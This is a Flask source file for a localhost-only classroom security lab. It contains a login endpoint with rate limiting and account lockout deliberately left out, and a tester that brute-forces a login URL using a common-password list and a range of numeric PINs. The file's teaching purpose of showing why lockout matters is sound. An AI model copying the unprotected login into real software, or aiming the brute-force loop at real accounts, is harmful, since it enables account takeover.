"""Activity 2 classroom lab (opt-in via ENABLE_LAB)."""

import bcrypt
from flask import Blueprint, current_app, jsonify, request, send_from_directory
from app.config import LAB_ENABLED, PAGES_DIR
from app.db import db
from app.permissions import login_required
from app.utils import json_error

bp = Blueprint("lab", __name__)


@bp.post("/api/lab-login")
def lab_login():
    # This endpoint exists ONLY for the Activity 2 localhost laboratory.
    # It intentionally has NO rate limiting or account lockout, which is the
    # point of the exercise, so it must stay OFF unless it is deliberately
    # switched on. Set ENABLE_LAB=1 in .env for the lab session.
    if not LAB_ENABLED:
        return json_error("Unprotected lab is disabled. Set ENABLE_LAB=1 to run the Activity 2 lab.", 403)
    if request.remote_addr not in {"127.0.0.1", "::1"}:
        return json_error("Unprotected lab is restricted to localhost.", 403)

    data = request.get_json(silent=True) or {}

    email = (data.get("email") or "").strip().lower()
    password = data.get("password") or ""

    if not email or not password:
        return json_error("Enter both an email and a password.", 400)

    with db() as conn, conn.cursor() as cur:
        cur.execute(
            """
            SELECT id, full_name, email, password_hash, is_active, role
            FROM users
            WHERE email=%s
            """,
            (email,)
        )

        user = cur.fetchone()

        if not user or not user["is_active"]:
            return json_error("Invalid login credentials.", 401)

        valid = bcrypt.checkpw(
            password.encode(),
            user["password_hash"].encode()
        )

        if not valid:
            # IMPORTANT:
            # Do NOT increase failed_login_attempts.
            # Do NOT set locked_until.
            return json_error("Invalid login credentials.", 401)

    return jsonify(
        message="Lab login successful.",
        user={
            "id": str(user["id"]),
            "fullName": user["full_name"],
            "email": user["email"],
            "role": user["role"]
        }
    ), 200


@bp.get("/lab")
def lab_page():
    if not LAB_ENABLED:
        return json_error("The security lab is disabled. Set ENABLE_LAB=1 to run the Activity 2 lab.", 403)
    return send_from_directory(PAGES_DIR,"lab_test.html")


@bp.get("/api/lab-test/stream")
@login_required
def lab_test_stream():
    # The classroom lab endpoint: an intentionally unprotected, localhost-only
    # brute-force demonstration. It is opt-in (ENABLE_LAB=1) and now requires an
    # authenticated session, so it can never be driven anonymously.
    if not LAB_ENABLED:
        return json_error("The security lab is disabled. Set ENABLE_LAB=1 to run the Activity 2 lab.", 403)
    if request.remote_addr not in {"127.0.0.1", "::1"}:
        return json_error("Lab tester is restricted to localhost.", 403)
    import time as _time
    import requests as _requests
    from urllib.parse import urlparse
    target=(request.args.get("target") or "http://127.0.0.1:5000/api/login").strip()
    login_type=(request.args.get("login_type") or "email").strip()
    login_value=(request.args.get("login_value") or "maria@gmail.com").strip()
    parsed=urlparse(target)
    if parsed.hostname not in {"localhost","127.0.0.1","::1"} or parsed.scheme not in {"http","https"}: return json_error("Lab tester only accepts localhost targets.",403)
    if login_type not in {"email","username"}: return json_error("Invalid login type.")
    candidates=["1234","12345","123456","12345678","password","password123","admin","admin123","admin1234","qwerty","welcome","student","student123"]+[f"{i:05d}" for i in range(5001)]
    candidates=list(dict.fromkeys(candidates))
    def generate():
        start=_time.perf_counter(); session_req=_requests.Session()
        yield "TaskChain / Security Lab — localhost controlled test\n"
        yield f"Target: {target}\nIdentifier: {login_value}\nCandidates: {len(candidates)}\n\n"
        try:
            for i,pw in enumerate(candidates,1):
                payload={login_type:login_value,"password":pw}
                try: r=session_req.post(target,json=payload,timeout=5)
                except _requests.RequestException as exc: yield f"[ERROR] {exc}\n"; return
                yield f"[{i:04d}] {pw:<18} HTTP {r.status_code}\n"
                if r.status_code==200:
                    yield f"\nSUCCESS — candidate matched: {pw}\nAttempts: {i}\nElapsed: {_time.perf_counter()-start:.2f}s\n"; return
                if r.status_code==429:
                    yield f"\nDEFENSE DETECTED — blocked after {i} attempts.\nElapsed: {_time.perf_counter()-start:.2f}s\n"; return
                _time.sleep(.01)
            yield f"\nTEST FINISHED — no candidate matched. Attempts: {len(candidates)}\n"
        finally: session_req.close()
    return current_app.response_class(generate(),mimetype="text/plain",headers={"Cache-Control":"no-store","X-Accel-Buffering":"no"})
